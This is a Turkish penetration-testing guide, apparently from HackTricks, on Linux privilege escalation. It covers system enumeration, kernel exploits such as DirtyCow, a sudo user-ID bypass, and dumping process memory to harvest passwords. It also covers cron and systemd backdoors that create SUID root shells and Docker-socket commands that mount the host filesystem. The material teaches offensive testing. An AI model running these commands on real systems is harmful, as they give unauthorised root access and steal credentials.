# Linux Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgisi

### OS bilgisi

İşletim sisteminin bilgilerini edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH`** değişkeni içindeki herhangi bir klasörde yazma izinleriniz varsa, bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:
```bash
echo $PATH
```
### Env info

İlginç bilgiler, parolalar veya API anahtarları ortam değişkenlerinde mi?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kerneli sürümünü kontrol edin ve ayrıcalıkları artırmak için kullanılabilecek bir açık olup olmadığını kontrol edin.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir savunmasız çekirdek listesi ve bazı **derlenmiş istismarlar** burada bulunabilir: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Diğer bazı **derlenmiş istismarlar** bulabileceğiniz siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O web sitesinden tüm savunmasız çekirdek sürümlerini çıkarmak için şunları yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernal açıklarını aramak için yardımcı olabilecek araçlar şunlardır:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (kurban üzerinde çalıştırın, yalnızca 2.x kernel için açıkları kontrol eder)

Her zaman **Google'da kernel sürümünü arayın**, belki kernel sürümünüz bazı kernel açıklarında yazılıdır ve bu durumda bu açığın geçerli olduğundan emin olursunuz.

### CVE-2016-5195 (DirtyCow)

Linux Yetki Yükseltme - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Görünüşteki savunmasız sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
Bu grep'i kullanarak sudo sürümünün savunmasız olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

Bu açığın nasıl istismar edilebileceğine dair bir **örnek** için **HTB'nin smasher2 kutusunu** kontrol edin.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem sayımı
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listele

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker konteynerinin içindeyseniz, ondan kaçmayı deneyebilirsiniz:

{{#ref}}
docker-security/
{{#endref}}

## Drives

**Nelerin monte edildiğini ve monte edilmediğini**, nerede ve neden olduğunu kontrol edin. Eğer herhangi bir şey monte edilmemişse, onu monte etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Kullanışlı yazılımlar

Kullanışlı ikili dosyaları listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin yüklü olup olmadığını kontrol edin**. Bu, bazı çekirdek istismarlarını kullanmanız gerektiğinde faydalıdır çünkü bunları kullanacağınız makinede (veya benzer birinde) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Güvenlik Açığı Olan Yazılımlar Yüklü

Yüklenen **paketlerin ve hizmetlerin sürümünü** kontrol edin. Belki de ayrıcalıkları artırmak için istismar edilebilecek eski bir Nagios sürümü vardır (örneğin)...\
Daha şüpheli olan yüklü yazılımların sürümünü manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Eğer makineye SSH erişiminiz varsa, makine içinde yüklü olan eski ve savunmasız yazılımları kontrol etmek için **openVAS** kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğunlukla işe yaramayacak çok fazla bilgi göstereceğini unutmayın, bu nedenle yüklü yazılım sürümlerinin bilinen açıklar için savunmasız olup olmadığını kontrol edecek OpenVAS veya benzeri bazı uygulamaların kullanılması önerilir._

## İşlemler

**Hangi işlemlerin** çalıştırıldığını kontrol edin ve herhangi bir işlemin **gerektiğinden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (belki root tarafından çalıştırılan bir tomcat?).
```bash
ps aux
ps -ef
top -n 1
```
Her zaman [**electron/cef/chromium hata ayıklayıcılarının** çalışıp çalışmadığını kontrol edin, bunu ayrıcalıkları artırmak için kötüye kullanabilirsiniz](electron-cef-chromium-debugger-abuse.md). **Linpeas**, sürecin komut satırında `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca **işlemlerin ikili dosyaları üzerindeki ayrıcalıklarınızı kontrol edin**, belki birinin üzerine yazabilirsiniz.

### Süreç izleme

[**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanarak süreçleri izleyebilirsiniz. Bu, sıkça yürütülen veya belirli bir dizi gereksinim karşılandığında çalıştırılan savunmasız süreçleri tanımlamak için çok yararlı olabilir.

### Süreç belleği

Bir sunucunun bazı hizmetleri **şifreleri düz metin olarak bellekte saklar**.\
Genellikle, diğer kullanıcılara ait süreçlerin belleğini okumak için **root ayrıcalıklarına** ihtiyacınız olacaktır, bu nedenle bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha faydalıdır.\
Ancak, **normal bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini okuyabileceğinizi unutmayın**.

> [!WARNING]
> Günümüzde çoğu makinenin **varsayılan olarak ptrace'a izin vermediğini** unutmayın, bu da ayrıcalıksız kullanıcılarınıza ait diğer süreçleri dökemezsiniz anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace erişimini kontrol eder:
>
> - **kernel.yama.ptrace_scope = 0**: tüm süreçler, aynı uid'ye sahip oldukları sürece hata ayıklanabilir. Bu, ptracing'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: yalnızca bir ana süreç hata ayıklanabilir.
> - **kernel.yama.ptrace_scope = 2**: Yalnızca yönetici ptrace kullanabilir, çünkü bu CAP_SYS_PTRACE yeteneğini gerektirir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında, ptracing'i yeniden etkinleştirmek için bir yeniden başlatma gerekir.

#### GDB

Bir FTP hizmetinin belleğine erişiminiz varsa (örneğin) Heap'i alabilir ve içindeki kimlik bilgilerini arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Verilen bir işlem kimliği için, **maps o işlemin** sanal adres alanında belleğin nasıl haritalandığını gösterir; ayrıca **her haritalanmış bölgenin izinlerini** de gösterir. **mem** sanal dosyası **işlemin belleğini** kendisi açığa çıkarır. **maps** dosyasından hangi **bellek bölgelerinin okunabilir olduğunu** ve bunların ofsetlerini biliyoruz. Bu bilgiyi **mem dosyasına erişmek ve tüm okunabilir bölgeleri** bir dosyaya dökmek için kullanıyoruz.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`, sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdekten sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Tipik olarak, `/dev/mem` yalnızca **root** ve **kmem** grubu tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows için Sysinternals araç setinden klasik ProcDump aracının Linux'taki yeniden tasarımıdır. Bunu [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) adresinden edinebilirsiniz.
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlem belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Root gereksinimlerini manuel olarak kaldırabilir ve sizin sahip olduğunuz işlemi dökebilirsiniz
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) üzerindeki Script A.5 (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer doğrulayıcı işlemin çalıştığını bulursanız:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Süreci dökebilirsiniz (bir sürecin belleğini dökmenin farklı yollarını bulmak için önceki bölümlere bakın) ve belleğin içinde kimlik bilgilerini arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **bellekten açık metin kimlik bilgilerini** ve bazı **iyi bilinen dosyalardan** **çalar**. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | Süreç Adı           |
| ------------------------------------------------- | -------------------- |
| GDM şifresi (Kali Masaüstü, Debian Masaüstü)      | gdm-password         |
| Gnome Anahtar Zinciri (Ubuntu Masaüstü, ArchLinux Masaüstü) | gnome-keyring-daemon |
| LightDM (Ubuntu Masaüstü)                         | lightdm              |
| VSFTPd (Aktif FTP Bağlantıları)                  | vsftpd               |
| Apache2 (Aktif HTTP Temel Kimlik Doğrulama Oturumları) | apache2              |
| OpenSSH (Aktif SSH Oturumları - Sudo Kullanımı)  | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron görevleri

Herhangi bir zamanlanmış görevin savunmasız olup olmadığını kontrol edin. Belki de root tarafından yürütülen bir scriptten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir mi? symlink'ler kullanabilir mi? root'un kullandığı dizinde belirli dosyalar oluşturabilir mi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH'ı bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"ın /home/user üzerinde yazma ayrıcalıklarına sahip olduğunu not edin_)

Eğer bu crontab içinde root kullanıcısı yolu ayarlamadan bazı komut veya betikler çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
O zaman, şunu kullanarak bir root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron bir joker karakterle bir script kullanma (Joker Karakter Enjeksiyonu)

Eğer root tarafından yürütülen bir script bir komutun içinde “**\***” içeriyorsa, bunu beklenmedik şeyler (örneğin privesc) yapmak için kullanabilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer joker karakter bir yolun önünde ise** _**/some/path/\***_ **, bu savunmasız değildir (hatta** _**./\***_ **de değildir).**

Daha fazla joker karakter istismar hilesi için aşağıdaki sayfayı okuyun:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron scripti üzerine yazma ve symlink

Eğer **root tarafından yürütülen bir cron scriptini değiştirebiliyorsanız**, çok kolay bir şekilde bir shell alabilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından yürütülen script, **tam erişiminizin olduğu bir dizini** kullanıyorsa, belki de o klasörü silmek ve **sizin kontrolünüzdeki bir script'i barındıran başka birine symlink klasörü oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık Cron Görevleri

Her 1, 2 veya 5 dakikada bir yürütülen süreçleri aramak için süreçleri izleyebilirsiniz. Belki bunu avantaja çevirip ayrıcalıkları artırabilirsiniz.

Örneğin, **1 dakika boyunca her 0.1 saniyede bir izlemek**, **daha az yürütülen komutlara göre sıralamak** ve en çok yürütülen komutları silmek için şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **kullanabilirsiniz** (bu, başlayan her süreci izler ve listeler).

### Görünmez cron işleri

Bir cron işi **bir yorumdan sonra bir satır sonu karakteri olmadan bir taşıyıcı dönüş koyarak** oluşturmak mümkündür ve cron işi çalışacaktır. Örnek (taşıyıcı dönüş karakterine dikkat edin):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Hizmetler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasını yazıp yazamayacağınızı kontrol edin, eğer yazabiliyorsanız, **bunu değiştirebilir** ve **hizmet başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **arka kapınızı çalıştıracak** şekilde ayarlayabilirsiniz (belki makinenin yeniden başlatılmasını beklemeniz gerekecek).\
Örneğin, arka kapınızı .service dosyasının içine **`ExecStart=/tmp/script.sh`** ile oluşturun.

### Yazılabilir hizmet ikili dosyaları

Eğer **hizmetler tarafından yürütülen ikili dosyalar üzerinde yazma izinleriniz varsa**, bunları arka kapılar için değiştirebilirsiniz, böylece hizmetler yeniden yürütüldüğünde arka kapılar çalıştırılacaktır.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH'i görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasöründe **yazma** yetkiniz olduğunu bulursanız, **yetkileri yükseltebilirsiniz**. **Hizmet yapılandırma** dosyalarında kullanılan **göreli yolları** aramanız gerekir, örneğin:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazabileceğiniz systemd PATH klasörü içinde **göreli yol ikili dosyasıyla aynı isme sahip bir **çalıştırılabilir** dosya oluşturun ve hizmet, savunmasız eylemi (**Başlat**, **Durdur**, **Yenile**) gerçekleştirmesi istendiğinde, **arka kapınız çalıştırılacaktır** (yetkisiz kullanıcılar genellikle hizmetleri başlatamaz/durduramaz, ancak `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Hizmetler hakkında daha fazla bilgi edinin: `man systemd.service`.**

## **Zamanlayıcılar**

**Zamanlayıcılar**, `**.service**` dosyalarını veya olayları kontrol eden `**.timer**` ile biten systemd birim dosyalarıdır. **Zamanlayıcılar**, takvim zamanı olayları ve monotonik zaman olayları için yerleşik destekleri olduğundan, cron'a alternatif olarak kullanılabilir ve asenkron olarak çalıştırılabilirler.

Tüm zamanlayıcıları şu şekilde listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Eğer bir zamanlayıcıyı değiştirebiliyorsanız, onu bazı systemd.unit varlıklarını (örneğin bir `.service` veya bir `.target`) çalıştıracak şekilde ayarlayabilirsiniz.
```bash
Unit=backdoor.service
```
Belgede, Birimin ne olduğunu okuyabilirsiniz:

> Bu zamanlayıcı süresi dolduğunda etkinleştirilecek birim. Argüman, ".timer" ile bitmeyen bir birim adıdır. Belirtilmezse, bu değer, zamanlayıcı birimi ile aynı ada sahip bir hizmete varsayılan olarak ayarlanır, ancak son ek hariç. (Yukarıya bakın.) Etkinleştirilen birim adı ile zamanlayıcı biriminin adı, son ek hariç, aynı şekilde adlandırılması önerilir.

Bu nedenle, bu izni kötüye kullanmak için şunları yapmanız gerekir:

- **yazılabilir bir ikili dosya** çalıştıran bir systemd birimi (örneğin bir `.service`) bulun
- **göreli bir yolu** çalıştıran bir systemd birimi bulun ve **systemd PATH** üzerinde **yazma ayrıcalıklarınız** olsun (o yürütülebilir dosyayı taklit etmek için)

**Zamanlayıcılar hakkında daha fazla bilgi edinin `man systemd.timer`.**

### **Zamanlayıcıyı Etkinleştirme**

Bir zamanlayıcıyı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şunu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Not edin ki **zamanlayıcı**, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` üzerinde ona bir symlink oluşturarak **etkinleştirilir**.

## Soketler

Unix Domain Sockets (UDS), **işlem iletişimi** için aynı veya farklı makinelerde istemci-sunucu modelleri içinde olanak tanır. Standart Unix tanımlayıcı dosyalarını kullanarak bilgisayarlar arası iletişim sağlarlar ve `.socket` dosyaları aracılığıyla yapılandırılırlar.

Soketler, `.socket` dosyaları kullanılarak yapılandırılabilir.

**Soketler hakkında daha fazla bilgi için `man systemd.socket` komutunu öğrenin.** Bu dosya içinde, birkaç ilginç parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak bir özet, soketin **nerede dinleyeceğini belirtmek için** kullanılır (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: Bir boolean argümanı alır. Eğer **doğru** ise, her gelen bağlantı için bir **hizmet örneği oluşturulur** ve yalnızca bağlantı soketi ona iletilir. Eğer **yanlış** ise, tüm dinleme soketleri **başlatılan hizmet birimine iletilir** ve tüm bağlantılar için yalnızca bir hizmet birimi oluşturulur. Bu değer, tek bir hizmet biriminin koşulsuz olarak tüm gelen trafiği işlediği datagram soketleri ve FIFOs için göz ardı edilir. **Varsayılan olarak yanlıştır**. Performans nedenleriyle, yeni daemonların yalnızca `Accept=no` için uygun bir şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Dinleme **soketleri**/FIFOs **oluşturulmadan önce** veya **sonra** **çalıştırılan** bir veya daha fazla komut satırı alır. Komut satırının ilk token'ı mutlak bir dosya adı olmalı, ardından işlem için argümanlar gelmelidir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **soketleri**/FIFOs **kapandıktan önce** veya **sonra** **çalıştırılan** ek **komutlar**.
- `Service`: **Gelen trafik** üzerinde **etkinleştirilecek** **hizmet** birimi adını belirtir. Bu ayar yalnızca Accept=no olan soketler için geçerlidir. Varsayılan olarak, soketle aynı adı taşıyan hizmete (sonek değiştirilmiş) ayarlanır. Çoğu durumda, bu seçeneği kullanmak gerekli olmamalıdır.

### Yazılabilir .socket dosyaları

Eğer **yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir şey ekleyebilirsiniz ve arka kapı soket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecek.**\
_Sistem, o soket dosyası yapılandırmasını kullanıyor olmalıdır, aksi takdirde arka kapı çalıştırılmayacaktır._

### Yazılabilir soketler

Eğer **herhangi bir yazılabilir soket** tespit ederseniz (_şimdi Unix Soketlerinden bahsediyoruz ve yapılandırma `.socket` dosyalarından değil_), o zaman **bu soketle iletişim kurabilirsiniz** ve belki bir açığı istismar edebilirsiniz.

### Unix Soketlerini Listele
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Sömürü örneği:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP soketleri

HTTP istekleri için dinleyen bazı **soketlerin olabileceğini** unutmayın (_.socket dosyalarından değil, unix soketleri olarak işlev gören dosyalardan bahsediyorum_). Bunu kontrol etmek için:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer soket **HTTP** isteği ile **yanıt veriyorsa**, o zaman onunla **iletişim kurabilir** ve belki de **bazı zayıflıkları istismar edebilirsiniz**.

### Yazılabilir Docker Soketi

Docker soketi, genellikle `/var/run/docker.sock` konumunda bulunan, güvenliği sağlanması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu sokete yazma erişimine sahip olmak, ayrıcalık yükselmesine yol açabilir. Bunun nasıl yapılacağına dair bir inceleme ve Docker CLI mevcut değilse alternatif yöntemler.

#### **Docker CLI ile Ayrıcalık Yükseltme**

Eğer Docker soketine yazma erişiminiz varsa, aşağıdaki komutları kullanarak ayrıcalıkları yükseltebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, ana bilgisayarın dosya sistemine kök düzeyinde erişimle bir konteyner çalıştırmanıza olanak tanır.

#### **Docker API'yi Doğrudan Kullanma**

Docker CLI mevcut olmadığında, Docker soketi hala Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **Docker Görüntülerini Listele:** Mevcut görüntülerin listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Bir Konteyner Oluştur:** Ana sistemin kök dizinini bağlayan bir konteyner oluşturmak için bir istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan konteyneri başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Konteynere Bağlan:** Komutların içinde çalıştırılabilmesi için konteynere bir bağlantı kurmak üzere `socat` kullanın.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, ana bilgisayarın dosya sistemine kök düzeyinde erişimle komutları doğrudan konteyner içinde çalıştırabilirsiniz.

### Diğerleri

Eğer **`docker` grubunun içinde** olduğunuz için docker soketi üzerinde yazma izinleriniz varsa, [**yetki yükseltmek için daha fazla yolunuz vardır**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API bir portta dinliyorsa, onu tehlikeye atma imkanınız da olabilir**](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

**Docker'dan çıkmanın veya onu kötüye kullanarak yetki yükseltmenin daha fazla yolunu** kontrol edin:

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) yetki yükseltme

Eğer **`ctr`** komutunu kullanabileceğinizi bulursanız, **yetki yükseltmek için bunu kötüye kullanabileceğinizden** dolayı aşağıdaki sayfayı okuyun:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** yetki yükseltme

Eğer **`runc`** komutunu kullanabileceğinizi bulursanız, **yetki yükseltmek için bunu kötüye kullanabileceğinizden** dolayı aşağıdaki sayfayı okuyun:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşimde bulunmasını ve veri paylaşmasını sağlayan karmaşık bir **İşlem Arası İletişim (IPC) sistemi**dir. Modern Linux sistemini göz önünde bulundurarak tasarlanmış olup, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür, süreçler arasında veri alışverişini artıran temel IPC'yi destekler ve **gelişmiş UNIX alan soketleri**ni andırır. Ayrıca, olayları veya sinyalleri yayınlamaya yardımcı olur, sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen bir çağrı sinyali, bir müzik çalarının sessize geçmesini sağlayabilir ve kullanıcı deneyimini artırabilir. Ayrıca, D-Bus, uygulamalar arasında hizmet taleplerini ve yöntem çağrılarını basitleştiren bir uzak nesne sistemi destekler ve geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, mesaj izinlerini (yöntem çağrıları, sinyal yayma vb.) toplu olarak eşleşen politika kurallarının etkisine göre yöneten bir **izin/verme modeli** üzerinde çalışır. Bu politikalar, otobüsle etkileşimleri belirler ve bu izinlerin istismar edilmesi yoluyla yetki yükseltmeye olanak tanıyabilir.

